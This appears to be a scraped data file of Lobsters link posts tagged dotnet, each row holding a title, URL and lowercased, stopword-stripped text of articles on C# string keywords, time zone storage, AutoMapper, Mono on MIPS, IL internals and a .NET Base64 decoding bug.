165,Lobsters,dotnet,"C#, F#, .NET programming",string vs. String is not a style debate,http://blog.paranoidcoding.com/2019/04/08/string-vs-String-is-not-about-style.html,string v string style debate,bigquery,often see developer debating using string v string simple style decision different discussing position brace tab v space etc meaningless distinction right answer finding decision everyone agree debate string string though simple style debate instead potential radically change semantics program keyword string concrete meaning c type systemstring exists core runtime assembly runtime intrinsictly understands type provides capability developer expect string net presence critical c type exist compiler exit attempting even parse line code hence string precise unambiguous meaning c code identifier string though concrete meaning c identifier go name lookup rule widget student etc could bind string could bind type another assembly entirely whose purpose may entirely differnt string worse could defined way code like string hello continued compile class tricksterstring void example string hello world okay probably expect class string public static implicit operator string string null actual meaning string always depend name resolution mean depends source file project type defined referenced assembly short requires quite bit context know mean true vast majority case string string bind type using string still mean developer leaving program interpretation place one correct answer string bind wrong type leave developer debugging hour filing bug compiler team generally wasting time could saved using string another way visualize difference sample string error time string might error might depends code many argue information technically accurate using string still fine exceedingly rare code base would define type name string defined sign bad code base reality though quite different defining string happens regularity demonstrated following bigquery select samplepath samplereponame fhbigquerygithubextractscontentsnetcs strpos samplereponame coreclr strpos samplereponame corefx strpos samplereponame roslyn strpos samplereponame corert strpos samplereponame mono strpos content class string limit looking result see string defined number completely valid purpose reflection helper serialization library lexers protocol etc library string v string real consequence depending code used remember see string v string debate semantics style choosing string give crisp meaning code base choosing string wrong leaving door open surprise future note discussion limited string also applies object int long short etc essentially type keywords introduced c
167,Lobsters,dotnet,"C#, F#, .NET programming",C#88: The Original C#,https://medium.com/@ricomariani/c-88-the-original-c-66a1b5de47d7,c original c,c original c note posterity introduction system basic consequence outcome,c original c note posterityintroductionevery topic original c vintage come project recruited microsoft interesting beast even interesting colleague thought would write note system still remembered basic worked obviously much longer article would necessary get everything able get sense operation primer zenith c able build run omega would call microsoft accesssystem basicsthe system designed support incremental compilation factored heavily every design aspect persistent storage compiles provided called global symbol cache gsc gsc object oriented database provided transaction simple isolation supporting one writer many reader reader saw database existed began session writer observed writes usual transaction isolation built using pagemapping strategy unlike one used pdb file even coincidence gsc cache sense could delete lose nothing timethe c language designed substantially compatible c programming language happened underlying compiler supported might call variant k r c mean function prototype optional lot thing int default compiler produced hybrid pcode native assembly traditional m application timethe compilation model might get built something like cnet today file could compiled order including h file really considered different c file system something like scan definition parse body might expect rather exploited incremental nature incrementally reparse outoforder convergence see team mantra twice incremental still cheap source file srfs divided source unit srus typical sru might single function single declaration could compound multiple definition atomic eg int x source unit created language object lob depended essentially compilation convergence happened due error sru could compiled necessarybutmissing lob recorded lob encountered later point sru required would queued recompile process might take several system processed file order specified simple projectini file meant make largely unnecessary among interesting feature option emit new ini order told compile junk thereby making fairly easy create maintain decent ordering without much human effortof course good idea put h file first tended lot define statement first build would really system built top existing c compiler apps pcode compiler opposed cmerge native compiler use basically system would set compiler symbol table forth right starting recompilation context easy seemed work okadditionally obj file binary format could imported system would know definition able crazy thing like figure symbol would resolved caseinsensitively link time hairy messincremental recompile achieved noting changed source file recomputing crc sru file changed srus would recompiled course would cause dependency recompiled system converged importantly nonobservable change eg adding new local variable function cause dependency become dirtybecause dependency management common practice required special treatment special interest one ifndef define endifthis required special treatment dependency cycle sru contains ifndef sru contains define without special treatment would never converge finally system incrementally produced readytolink object file entire content segment one file linked usual m incremental linkerconsequencesthe presence high quality dependency information made possible implement cool source browsing feature ultimately found way product line maybe could considered antecedent intellisense fact virtually knowledge gsc also meant many system error could diagnosed browsing gsc object graph raw formthe fact typical input code written toolset type loosely enforced across compilation unit meant c system good finding inconsistency still code good thousand error fixed get existing code build fact global symbol namespace tended work well forced certain horrible could give variable two different type two different compilation unit get accidental union instancesimilarly fact lib file like imported meant name also unified crazy override unknown side effect banishedbasically thing super linter super super program database considered weighing whopping big toy today standard might smaller used pointerish data structure disk representation say love object oriented database even much le big time different considered valuable enough generate ton fruit many feature visual studio ecosystem root c debugging format incremental linking incremental compilation minimal rebuild maybe intellisense hard say failure size impact crater never go anywhere directlygood time
168,Lobsters,dotnet,"C#, F#, .NET programming",Behind the burst compiler,https://xoofx.com/blog/2019/03/28/behind-the-burst-compiler/,behind burst compiler,unite la dotnetos conference dotnext conference burst compiler burst compiler,last year made presentation unite la dotnetos conference warsaw dotnext conference moscow burst compiler working past two year unity nutshell burst compiler technology aimed unlocking performance subset c code beyond c usually able translating net il code highly efficient native code consult slide right cheer
169,Lobsters,dotnet,"C#, F#, .NET programming",Storing UTC is not a silver bullet,https://codeblog.jonskeet.uk/2019/03/27/storing-utc-is-not-a-silver-bullet/,storing utc silver bullet,related blog post lau taarnskov background eu time zone rule change released iana application example interlude requirement option convert utc use forever result option convert utc immediately reconvert rule change start start timezonerules result implementation option preserve local time using utc derived data recomputed utcstart timezonerules result implementation principle preserving supplied data representation v information possible option start timezonerules ambiguous skipped time recurrent event time zone boundary change split past v recent past conclusion like,note pretty long post interested detail conclusion bottom intended read standalone fashion also related blog post lau taarnskov find one difficult read whatever reason maybe give try read stack overflow question involving time zone almost always someone giving advice ever store utc convert utc soon convert back target time zone late display purpose never time zone issue say blog post intended provide counterpoint advice certainly saying storing utc always wrong thing always right thing either note simplification blog post go supporting nongregorian calendar system leap second hopefully developer writing application need support either already aware requirement background eu time zone rule change timing blog post due recent european parliament proceeding look like probably end clock changing twice year summer time winter time within eu member state precise detail yet finalized unimportant bigger point purpose blog post assume member state decide whether spring forward one last time march staying permanent summer time fall back one last time october staying permanent winter time november onwards utc offset country fixed may country currently always offset different offset point example france could use winter time germany could use summer time larger point time zone rule change application expect change corner case normal way thing work usually multiple set rule change released iana year least european change likely long notice period often case sometimes find rule change day happen application example sake making everything concrete going imagine writing application help conference organizer conference organizer create conference within application specifying happening amongst thing application display countdown timer number hour left start conference obviously real application would lot going enough examine implementation option available get even concrete assume conference organizer registered conference called kindconf said start amsterdam july perform registration march recently published iana time zone database predicts offset observed amsterdam july sake example assume netherlands decides fall back october one final time leaving permanent offset complete picture assume decision taken february iana publishes change march part release application developer option gone detail database support different datetime type important course probably deserves separate blog post right perdatabase basis assume represent information want represent somehow interlude requirement get implementation mention topic brought time comment twitter assuming conference still occur july word instant time conference start change rule change unlikely would ever show requirement document remember ever meeting product manager done type contingency planning lucky someone would work going problem long rule actually change point need go requirement implementation work argue new requirement sort latent undiscovered requirement always known back option convert utc use forever schema conference table database might look like id autoincremented integer name string start datetime utc address string entry kindconf would look like id name kindconf start address europaplein gz amsterdam netherlands entry preserved forever without change happens countdown timer result good news anyone observing timer see smoothly count towards jump bad news reach conference actually start another hour left good option convert utc immediately reconvert rule change schema conference table would preserve time zone id using iana id simplicity could window system time zone id absolutely necessary alternatively time zone id could derived time required later id autoincremented integer name string start datetime utc address string time zone id string initial entry kindconf would look like id name kindconf start address europaplein gz amsterdam netherlands timezoneid europeamsterdam march new time zone database released entry could changed make start time accurate id name kindconf start address europaplein gz amsterdam netherlands timezoneid europeamsterdam change procedure look like need convert utc value back local time convert back utc using different rule rule force entry created look like actually need extra field schema somewhere timezonerulesversion could potentially databasewide value although going reasonable update entry value atomically allowing value per entry even usually expect entry updated roughly time likely make thing simpler original entry actually id name kindconf start address europaplein gz amsterdam netherlands timezoneid europeamsterdam timezonerules modified entry id name kindconf start address europaplein gz amsterdam netherlands timezoneid europeamsterdam timezonerules course entry could updated many time course time maybe actually update entry start time change either way work result anyone refreshing countdown timer event see counter increase hour entry updated may look little odd mean countdown timer reach conference ready start assuming desired behaviour implementation let look roughly would needed perform update c code assume use noda time start consider happens using noda time public class conference public int id get set public string name get set public string address get set public instant start get set public string timezoneid get set public string timezonerules get set code parameter might field class public void updatestarttime conference conference dictionary string idatetimezoneprovider timezoneprovidersbyversion string latestrules map start instant time zone using old rule idatetimezoneprovider oldprovider timezoneprovidersbyversion conferencetimezonerules datetimezone oldzone oldprovider conferencetimezoneid zoneddatetime oldzonedstart conferencestartinzone oldzone idatetimezoneprovider newprovider timezoneprovidersbyversion latestrules datetimezone newzone newprovider conferencetimezoneid preserve local time new time zone rule zoneddatetime newzonedstart oldzonedstartlocaldatetimeinzoneleniently newzone update conference entry new information conferencestart newzonedstarttoinstant conferencetimezonerules latestrules inzoneleniently call going common issue look later ambiguous skipped time code would work noda time would make reasonably straightforward build dictionary time zone provider publish nzd file ever created onwards project web site code updated latest stable version nodatime nuget package latestrules parameter required datetimezoneproviderstzdb could used instead idatetimezoneproviderversionid could obtain current version however approach three important requirement concept version time zone rule available able load specific version time zone rule able use multiple version time zone rule application using c relying timezoneinfo good luck three doubt feasible far simple box may require external service providing historical data easily comment platform useful way suspect dealing multiple version time zone data something developer come across option preserve local time using utc derived data recomputed spoiler alert preferred option approach information conference organizer supplied july preserved never changed additional information entry changed time zone database updated converted utc instant also preserve version time zone rule used computation way allowing process updating entry restarted failure without starting scratch strictly required also probably useful diagnostic information utc instant stored convenience utc representation make easier provide total ordering thing happen also compute time right given instant countdown timer unless actually useful could easily omit entirely noda time benchmark suggest unlikely conversion every request cause bottleneck single localtoutc conversion notterriblyfast benchmark machine take environment close noise case relevant fine store utc described schema would id autoincremented integer name string local start datetime specified time zone address string time zone id string utc start derived field convenience time zone rule version optimization purpose original entry id name kindconf localstart address europaplein gz amsterdam netherlands timezoneid europeamsterdam utcstart timezonerules march time zone database released modified id name kindconf localstart address europaplein gz amsterdam netherlands timezoneid europeamsterdam utcstart timezonerules result option update jump hour reach conference start implementation time need convert old utc value back local value old time zone rule version old utc start time irrelevant simplifies matter significantly public class conference public int id get set public string name get set public string address get set public localdatetime localstart get set public string timezoneid get set public instant utcstart get set public string timezonerules get set code parameter might field class public void updateutcstart conference conference idatetimezoneprovider latestzoneprovider datetimezone newzone latestzoneprovider conferencetimezoneid preserve local time new time zone rule zoneddatetime newzonedstart conferencelocalstartinzoneleniently newzone update conference entry new information conferenceutcstart newzonedstarttoinstant conferencetimezonerules latestzoneproviderversionid time zone rule version optional code could ported use timezoneinfo instead obviously biased perspective code pleasant would least reasonable probably true platform prefer option really different option still storing utc value right true believe difference important utc value optimization effectively principle preserving supplied data key difference option option store never change conference organizer entered organizer told u event would start given address amsterdam july stored information never need change unless organizer want change course utc value derived golden information rederived context change time zone rule change option store original information store derived information utc instant need store information tell u context derived old time zone rule version updating entry need get back original information rederive utc instant using new rule going need original information anyway store implementation end simpler mean matter whether even old time zone rule representation v information important note talking preserving core information organizer entered purpose example least need care representation happened use enter july parsed use calendar control provided u think important part core information often useful exercise consider aspect data using core incidental receiving data another system text example probably want store complete xml json choice xml json relevant data could represented xml file json file unlikely anything later need know care possible option omitted fourth option could useful mixture store datetime utc offset effectively got local start time utc instant single field show value start id name kindconf start address europaplein gz amsterdam netherlands timezoneid europeamsterdam timezonerules march time zone database released modified id name kindconf start address europaplein gz amsterdam netherlands timezoneid europeamsterdam timezonerules system support datetime utc offset well database language using might attractive solution important note time zone id still required unless derive address whenever need huge difference knowing time zone applied knowing utc offset one specific situation personally sure big fan option combine original derived data single field local part original data offset derived like separation original derived data option option presented let look corner case mentioned course post ambiguous skipped time implementation shown used inzoneleniently method noda time mapping utc instant local time always completely unambiguous single time zone reverse mapping local time utc instant always unambiguous example let take europelondon time zone march local time spring forward changing offset october local time fall back changing offset mean happen europelondon time zone occurs twice reasonable validate conference organizer specifies starting time conference either prohibiting given time skipped asking information given time ambiguous point highly unlikely conference transition generally done middle night scenario eg schedule automated backup may well fall fine point first registration also possible previouslyunambiguous local time could become ambiguous new time zone rule inzoneleniently handle way documented resolverslenientresolver may well appropriate choice given application developer consider carefully write test recurrent event example given far single event recurrent event weekly meeting end trickier still change time zone rule change offset instance others likewise meeting may well attended people single time zone vital recurrence would single coordinating time zone offset may need recomputed every time zone involved every occurrence application developer think achieved within performance requirement time zone boundary change split far considered time zone rule changing option stored time zone id within entry assumes time zone associated event change time assumption may valid far aware time zone rule change often change time zone given location entirely possible thing change time suppose conference amsterdam rotterdam currently rotterdam us europeamsterdam time zone netherlands split two country feasible time conference occurs could europerotterdam time zone something equivalent end truly diligent application developer might treat time zone id derived data based address conference part checking entry time zone database updated might want find time zone id address conference case changed multiple service provide information although may need multistep process first converting address latitudelongitude position finding time zone latitudelongitude past v recent past post future datetime value twitter thread discussing time zone rule change general assertion safe store utc instant related event past would broadly agree one big caveat mentioned earlier sometimes government adopt time zone rule change almost notice additionally significant delay change published available within application delay vary massively based platform mean conversion utc value say year ago probably stay valid recording date time yesterday quite possible using incorrect rule without knowing even old rule change rarer experience need account depends application like many thing least consider principle described unless much harder maintain real source information reason default conclusion general advice convert local datetime data utc store overly broad view future nearpast event take account time zone rule change making initial conversion potentially inaccurate part point writing blog post raise awareness even people still recommend storing utc add appropriate caveat rather treating universal silver bullet explicitly bring timestamps point machinegenerated timestamps naturally instant time recording instant something occurred unambiguous way storing utc entirely reasonable potentially offset time zone location timestamp generated relevant note case source data local time converted bigger point go beyond date time time zone choosing information store time discard information conscious choice happy discarding input format used enter date probably still decision make defaulting convert utc default discarding information case valid make conscious choice ensure store information think may needed later might also want consider whether separate source information derived information particularly relevant come archiving may want discard derived data save space much easier already aware data derived experience developer either think datetime detail nearly enough coding aware pitfall decide mean hard contemplate hopefully worked example real life complexity show done take certain amount conscious thought rocket science like like loading related
170,Lobsters,dotnet,"C#, F#, .NET programming","Southern Fried F# Raleigh, NC; April 13th 2019",https://southernfriedfsharp.com,southern fried f raleigh nc april,,
171,Lobsters,dotnet,"C#, F#, .NET programming",AutoMapper's Design Philosophy,https://jimmybogard.com/automappers-design-philosophy/,automapper design philosophy,model mvc bespoke model null conditional operator enter automapper automapper design philosophy,lot people use automapper love meet many people hate hear story becomes clear automapper abused per se used without understanding automapper exists problem designed solve automapper originated beginning large mvc application way back early day mvc back really nt guidance exactly mvc mvc framework strong concept model rail django many others firstclass citizen joke aspnet mvc silent adopted name view model describe model mvc model specifically designed view started longrunning project rule view model view model would designed one one view information needed render model bind contained view model rule place started building screen dozen screen started notice problem bespoke model built screen needed build view model type knew wanted create view model per screen past name type name member found nearly screen subset data richer model lot boring assignment code var order dbcontextfindbyid id var orderdto new orderdto id orderid customername ordercustomerfullname lineitems orderlineitemsselect li new orderdtoorderlineitem id liid productname liproductshortname description liproductdescription count licount price liitemprice tolist noticed couple thing dto name arbitrary sometimes called model sometimes dto member name shortenedabbreviated arbitrarily nt rhyme reason behind whatever developer decided top would get null reference exception fairly frequently missing data whatever reason simple assignment expression would blow also null conditional operator top would unit test making sure property populated appropriately nothing missing putting two together going recipe disaster app would eventually nearly screen enter automapper architect showed tech lead project time said fix main problem saw view model subtly pointlessly different code handle sparse model missing data errorprone often missed test assignment easy get wrong business value property named price instead itemprice since worked hard original model name adhering ubiquitous language broader team ok developer take shortcut view model design front set build tool enforced convention destination type removed null reference exception made super easy test thus automapper born automapper design philosophy automapper work enforces convention assumes destination type subset source type assumes everything destination type meant mapped assumes destination member name follow exact name source type assumes want flatten complex model simple one assumption come original use case view model mvc assumption line view model design automapper could enforce view model design philosophy true power convention laying set enforceable design rule help streamline development along way enforcing convention let developer focus value add activity le activity provided zero negative value like designing bespoke view model writing thousand dumb unit test usage automapper stayed steady year design philosophy view model nt changed find hating tool important ask problem tool designed solve problem different perhaps tool nt good fit
173,Lobsters,dotnet,"C#, F#, .NET programming",Bolero: F# in WebAssembly,https://fsbolero.io,bolero f webassembly,html template hot reloading,html template hot reloading alternatively use html file template type provider bolero provides hot reloading html template file immediate feedback
174,Lobsters,dotnet,"C#, F#, .NET programming",C#: 6 Years Later,https://ruoyusun.com/2019/03/17/c-sharp-in-2019.html,c year later,c year later month c new language feature net core always return linux develop maclinux deploy run linux selfcontained deployment ecosystem c fun hn reddit,c year later mar year ago wrote post titled month c summarize experience language since programmed c professionally quite c programming hobby game using unity godot recently picked c work related project language ecosystem changed lot past year dropped quick note experience c time quick comparison year ago new language feature year ago writing c net framework asyncawait introduced c first experience using asyncawait actually javascript implementation straightforward support expanding language eg c allows async main function feature introduced ago c library caught provided decent api support list new feature find using quite lot string interpolation nullconditional operator data value although prefer explicit way handling null like option null core language syntax sugar nice pattern matching auto property initializers public int speed get set variable int number expression function member public string speed tuple enhancement ugly discover new feature ide telling thing done newer cleaner way talk ide later net core previous post biggest complaint c window mono never production grade runtime net core theoretically possible write window run linux however practice still depends one dependency work crossplatform le problem serverside library typical example wpf wpfbased ui app expect work linux time soon code interpolate native abi osspecifics take care dll compiled net framework even code compatible dll work net core recompile net standard use multitargeting api behave uniformly across platform example would always return linux biggest complaint really mentioned documentation c project working requires taking game logic code written net framework unity making unityindependent run linux server c work work box moving net framework net core unity related quirk deal dlls need recompiled overall smooth ride develop maclinux work laptop macbook pro start work project macos six year ago visual studio resharper pretty viable option want powerful ide however since jetbrains introduced rider become competitive alternative furthermore vscode omnisharp come long way use c game project pretty happy visual studio mac evolved monodevelop overall problem writing c nonwindows however ended installing window mac switch window reason good profilers maclinux c used jetbrains dottrace red gate ant neither work maclinux fact since developer writing c use window motivation tool support maclinux internal tool windowsonly example game setting tool wpf application unfortunately work maclinux deploy run linux net core come selfcontained deployment make easy deploy linux whether use machine image like ami container produce selfcontained binary ci pipeline copy executables target produce deployment image six year ago could theory deploy linux via mono however mono pretty noticeable performance issue compared net framework window time decide run series load testing net core project udp game server linux micro aws instance running ubuntu result quite good code performant serious gc issue ecosystem six year ago complained net ecosystem microsoftcentric six year later statement probably still le true difference microsoft open six year ago c ecosystem used tie developer expensive microsoft platform solution six year later feel microsoft provides support guidance prominent communitydriven project grow ecosystem c longer vendor lockin rather open platform c fun six year ago would never use c fun personal project thing changed since fun project game related actually use c lot unity c pretty much choice game server c quite good game client code c even need share code client server avoiding language context switch big win discus hn reddit
175,Lobsters,dotnet,"C#, F#, .NET programming",The directhex! In an Adventure with MIPS (2013),https://apebox.org/wordpress/linux/545,directhex adventure mips,breakthrough added since first time breakage edit,trying build mono mips debian long time decade fact mono first attempt back mono source meg today never worked though end upstream version later gave turned mipsel target architecture package became debian developer one first thing try mono various previously unsupported architecture running build debian porterboxes supposedly mips support evidenced mipsrelated file source tree try fail upstream would say work repeat process every major release see changed breakthrough spurred removal two bitrotted architecture sparc decided try time investigating deeply reason failure help upstream developer alex rønne petersen couple hour ircdriven gdb test program disassembly later seemingly innocent comment flagged something brain alexrp zor baldrrfwname til mul mult thing mips notable well mips processor lack whole bunch instruction commonly used assembler mul one valid mips assembler expanded multmflo compiling call macro mnemonic shorthand preferred term pseudoinstructions issue directhex mono nt trying use mul instruction right mean instruction nt exist far cpu concerned macro compiler thing see headed directhex miniminimipsc define usemul use mul instead multmflo multiply argh see thing mips pseudoinstructions may real instruction given cpu implementation strictly speaking mul standard instruction given cpu might anyway make multiplication little faster using one instruction two multiplication case debian mips infrastructure based around ict processor extension upstream mono developer building testing extended cpu never seeing issue flipping define amending instruction length setting another file fixed build mono running mips first time ever digging history git showed annoying implementation quirk usemul added late replacing previously used multmflo version code existed mono source since first time full mips port committed never saw breakage patched work added mipsel experimental build still failed runtime would build fine class library build would fail random time random meaningless stack trace unrepeatable kind race condition build would eventually succeed hammered make time good debian build daemon back square except epiphany yesterday heard loongson processor missing instruction one hit intermittently started search place might need work around kind issue found patch binutils replacing one noop instruction another usrbinas fed flag turn nop another pseudoinstruction mips well alias opcode shift left logical register data noop latest generation chip opcode heavy load fail causing inconsistent state cpu register flag replaces sll also noop instruction trigger failure chip chip although stated documentation long program get fed problem since us replacement use jitter generate opcodes oh fuck diff git amonoarchmipsmipscodegenh bmonoarchmipsmipscodegenh index amonoarchmipsmipscodegenh bmonoarchmipsmipscodegenh enum misc coprocessor ops define mipsmove c dest src mipsaddu c dest src mipszero define mipsdmove c dest src mipsdaddu c dest src mipszero define mipsnop c mipssll define mipsnop c mipsor c mipsat define mipsbreak c code c code define mipsmfhi c dest mipsformatr define mipsmflo c dest mipsformatr oh yes could mono using sll recommended noop instruction mips instruction reference manual causing failure test debian build test infrastructure happens use defective silicon upstream unable reproduce problem use better silicon well last night uploaded includes patch force replacement noop instruction test built fine porterbox damn experimental buildd get around work finally decade mono package available mips debian time change line work around year old chinese knockoff processor edit thing finally built turn despite everything replacement nop opcode enough reread post binutils list pay close attention theory still enough fully eliminate possible hang possiblity extremely low hard hit real code filthy lie easy hit issue real code fromsource build whole mono class library replacement instruction build net dying way improvement failing early build enough thankfully debian mipsel build server loongson year old broadcom swarm developer board fast also broken luck smiled caused build go one broadcom machine experimentalmipseldchroot directhex eder mono version head mono jit compiler version debian long time coming
176,Lobsters,dotnet,"C#, F#, .NET programming",C# 8 – Introducing Target-typed new expressions,http://www.devsanon.com/c/c-8-introducing-target-typed-new-expressions/,c introducing targettyped new expression,targettyped new expression,far talked quite new feature c talked c fixing interpolated verbatim string talked language new index struct usage hat operator talked default interface method article talk another feature people might call small minor still useful clean code remove lot noise targettyped new expression know u software engineer hate writing much code also much unneeded code hate reading try simplify thing much possible long time ago c introduced var keyword help u case like following somenamespacesomeclass instancename new somenamespacesomeclass could simplified var instancename new somenamespacesomeclass case obvious reader type instancename object need clearly define newcomer language sometimes feel like var javascript var still strong typing simply syntactical sugar compiler replace var keyword proper type well c introducing new way perform reducing amount code write trying instantiate omitted inferred usage one example initializing field inside class struck internal class something private readonly static object ssyncobj new public something consolewriteline ctor called example something really large like private static readonly concurrentdictionary myconcdict new concurrentdictionary simplified cleaned would following result private static readonly concurrentdictionary myconcdict new also omit type duplication want perform field initialization also inside field initialization another field initialization example dictionary mydict new new also use method call etc target type inferred example xmlreadercreate reader new ignorewhitespace true another simplification code noise reduction please follow like u
177,Lobsters,dotnet,"C#, F#, .NET programming",.NET Internals Cookbook Part 4 Type members,https://blog.adamfurmanek.pl/2019/03/09/net-internals-cookbook-part-4/,net internals cookbook part type member,part table content code language running clr code let flamewar begin theory object break application contravariant position mix covariant contravariant position great series eric lippert great post tomasz sitarek alexandra rusina post code implement polymorphism manually default method interface implement polymorphism manually john skeet post,fourth part net internals cookbook series convenience find part table content part table content add type constructor interface c il yes see code metadata version extern mscorlib publickeytoken ver assembly hash algorithm ver module mvid imagebase alignment windowscuicorflags ilonly image base class member declaration class public auto ansi beforefieldinit program extends mscorlib systemobject method public hidebysig static void main cil managed entrypoint maxstack local init class ifoo foo language line nop line newobj instance void foo ctor line callvirt instance void ifoo bar nop line ret end method program main method public hidebysig specialname rtspecialname instance void ctor cil managed maxstack call instance void mscorlib systemobject ctor nop ret end method program ctor end class program class interface public abstract auto ansi ifoo method private hidebysig specialname rtspecialname static void cctor cil managed maxstack line nop line ldstr ifoo type constructor call void mscorlib systemconsole writeline string nop line ret end method ifoo cctor method public hidebysig newslot abstract virtual instance void bar cil managed end method ifoo bar end class ifoo class public auto ansi foo extends mscorlib systemobject implement ifoo method private hidebysig specialname rtspecialname static void cctor cil managed maxstack line nop line ldstr foo type constructor call void mscorlib systemconsole writeline string nop line ret end method foo cctor method public hidebysig specialname rtspecialname instance void ctor cil managed maxstack line call instance void mscorlib systemobject ctor nop line nop line ldstr foo instance constructor call void mscorlib systemconsole writeline string nop line ret end method foo ctor method public hidebysig newslot virtual final instance void bar cil managed maxstack line nop line ldstr bar call void mscorlib systemconsole writeline string nop line ret end method foo bar end class foo familiar il follow comment part looking class interface public abstract auto ansi ifoo method private hidebysig specialname rtspecialname static void cctor cil managed maxstack line nop line ldstr ifoo type constructor call void mscorlib systemconsole writeline string nop line ret end method ifoo cctor method public hidebysig newslot abstract virtual instance void bar cil managed end method ifoo bar end class ifoo interface method named cctor special name il constructor named ctor whereas type constructor type initializers considered class constructor hence name cctor however useful constructor called specify type constructor structs well may ignored situation instance creation default value struct type trigger static constructor c standard change name indexer using code using system public class program public static void main foo foo new foo consolewriteline foo class foo systemruntimecompilerservicesindexername theitem public int int get return set decompile see call callvirt instance foo gettheitem would use language without direct support indexer remember language running clr need call name static field method interface yes see code metadata version extern mscorlib publickeytoken ver assembly hash algorithm ver module mvid imagebase alignment windowscuicorflags ilonly image base class member declaration class public auto ansi beforefieldinit program extends mscorlib systemobject method public hidebysig static void main cil managed entrypoint maxstack language line nop line call void ifoo bar nop line ret end method program main method public hidebysig specialname rtspecialname instance void ctor cil managed maxstack call instance void mscorlib systemobject ctor nop ret end method program ctor end class program class interface public abstract auto ansi ifoo method public hidebysig static void bar cil managed maxstack line nop line ldstr bar call void mscorlib systemconsole writeline string nop line ret end method ifoo bar end class ifoo c support il define static field method type constructor many object created new foo bar one property assigned calling setter see code using system public class program public static void main foo foo new foo bar class foo public int bar get set decompile get newobj instance void foo ctor callvirt instance void foo setbar clearly one object setter call covariance contravariance work array generic allows return accept subtype base type expected short explanation actually lot intricate detail may ignored first type class type specifies requirement imposed object whereas class concrete implementation c class language type without class objectoriented programming without class oddly enough j considered objectoriented language even though based object everywhere whereas c considered oop based class maybe call classoriented language let flamewar begin also mean subtype subclass time subclass subtype technically consider nominal subtyping structural subtyping subtyping without subclassing many combination highly recommend reading theory object explains depth also playing j scala beneficial language interesting type system let get back c imagine class base class derived base consider ienumerable derived instance ienumerable base derived subtype base thanks assign ienumerable derived ienumerable base work typically use returning value method often say return value covariant position true time go input parameter create delegate type action base assign instance action derived work say input parameter contravariant position true time covariance supported array delegate also called method group variance generic type parameter interface delegate marked using keyword c contravariance supported delegate generic type parameter interface delegate marked keyword covariance array dangerous supported java c emerged c copied easily break application using system public class program public static void main object object new string object output runtime exception line attempted access element type incompatible array stack trace systemarraytypemismatchexception attempted access element type incompatible array programmain use array string array object fine unless assign nonstring content get exception runtime fortunately time compiler find subtle bug use generic type come input parameter compiler figure contravariant position using system public class program public static void main action string derived string consolewriteline action object base derived output compilation error line col implicitly convert type systemaction string systemaction object explicit conversion exists missing cast lambda accepting string printing want use lambda accepting object clearly work would allowed pas object string parameter generally input position contravariant whereas output position covariant thing get really tricky mix covariant contravariant position using system public class program public static void main action base baseaction base b consolewriteline base b action derived derivedaction baseaction action base derivedaction nt work could call derivedaction new base wrong action action derived derivedhigherorderfunction action derived action action new derived action action base basehigherorderfunction derivedhigherorderfunction basehigherorderfunction baseaction public class base public class derived base see higher order function reverse relationship subtypes see also great series eric lippert explaining thing get tricky higher order function great post tomasz sitarek polish language see difference type class alexandra rusina post showing multiple example use extension method dynamic see code using system public class program public static void main int x xextend dynamic x yextend static class foo public static void extend int x consolewriteline x extension method compiled static one code fact call void foo extend c could write however dlr look method object use extension dynamic code side note actually explains creating trait using extension method useful unless implement polymorphism manually call method call bound statically dynamic dispatch whole point trait mechanism yet another side note java introduced default method interface used build basic trait support polymorphism dynamically bound call base method super java nomenclature box need specify superclass base implementation explicitly hopefully c get right always implement polymorphism manually difference equal equal bound runtime bound compile time see using system public class program public static void main foo one new foo foo two new foo consolewriteline foo one foo two bool oneequals two bool b one two consolewriteline foo one object three still foo object three two bool c oneequals three bool one three consolewriteline object three still foo foo two bool e threeequals one bool f three one class foo public override bool equal object consolewriteline custom equal return baseequals public static bool operator foo lh foo rh consolewriteline custom return objectreferenceequals lh rh public static bool operator foo lh foo rh consolewriteline custom return objectreferenceequals lh rh output foo one foo twocustom equalscustom foo one object three still foo custom equalsobject three still foo foo twocustom equal see equal us actual object type whereas bound statically decompile code get ldstr foo one foo two call void mscorlib systemconsole writeline string nopline callvirt instance bool mscorlib systemobject equal object call bool foo opequality class foo class foo ldstr foo one object three still foo call void mscorlib systemconsole writeline string nopline stlocs threeline ldlocs callvirt instance bool mscorlib systemobject equal object stlocs cline ldlocs stlocs dline ldstr object three still foo foo two call void mscorlib systemconsole writeline string nopline ldlocs callvirt instance bool mscorlib systemobject equal object stlocs eline ldlocs stlocs f see nonoverloaded operator us ceq instruction write parameterless constructor struct c il metadata version extern mscorlib publickeytoken ver assembly hash algorithm ver module mvid imagebase alignment windowscuicorflags ilonly image base class member declaration class public auto ansi beforefieldinit program extends mscorlib systemobject method public hidebysig static void main cil managed entrypoint maxstack local init valuetype foo one valuetype foo two language line nop line ldlocas one call instance void foo ctor line ldlocas two initobj foo line ret end method program main method public hidebysig specialname rtspecialname instance void ctor cil managed maxstack call instance void mscorlib systemobject ctor nop ret end method program ctor end class program class private sequential ansi sealed beforefieldinit foo extends mscorlib systemvaluetype pack size method public hidebysig specialname rtspecialname instance void ctor cil managed maxstack line nop line ldstr parameterless constructor call void mscorlib systemconsole writeline string nop line ret end method foo ctor end class foo c supposed introduce way implementing parameterless constructor removed bug activatorcreateinstance see also john skeet post difference new struct default struct former call parameterless constructor latter creates new instance field zeroed likely make difference
178,Lobsters,dotnet,"C#, F#, .NET programming",Base64 decoding bug that is present in all version of .NET,https://detunized.net/posts/2019-03-06-base64-decoding-bug-that-is-present-in-all-version-of-.net/,decoding bug present version net,code stackoverflow answer fix rewrote code make faster mono dev medium,one sunny morning sitting front laptop refactoring c code everything going smooth going productive day added one many equal sign constant string literal thing blew gone productivity gone peaceful refactoring sunday even sun decided hide behind cloudafter spending minute trying figure wrong realized microsoft apparently stumbled upon ancient bug decoding function bug must present since introduction net year whoa old difficult reproduce go abc technically illegal legal version abc notice one padding character encoding represents every bit binary input one ascii character mean every character encoded string represent byte encoded data multiple byte encoder add padding character make multiple character make abc correctly padded string adding another make abc decodes two byte correct adding another padding character end really change encoded value like adding space end sentence yes change meaning sentence net think abc decodes one byte got shorter weird since made input longer also got different first byte changed exception get thrown either add another get exception amazing code using system public class program public static void main decodeandprint abc decodeandprint abc static void decodeandprint string consolewriteline stringjoin output abc abc really amazing one discovered many year got discovered get fixed quite fundamental information exchange wire used place yet net got away buggy decoder many yearsat first believe started investigate googled really find much posted stackoverflow get much luck either even answer question figured going searching github stumbled upon fix net core made july latest net core version handle correctly throw exception unhandled exception systemformatexception input valid string contains nonbase character two padding character illegal character among padding character char inputptr inputlength string programdecodeandprint string line programmain line took year find fix interesting one really tried fix specifically happened rewrote code make faster subtle bug illicit second padding character end string caused decode succeed dropping 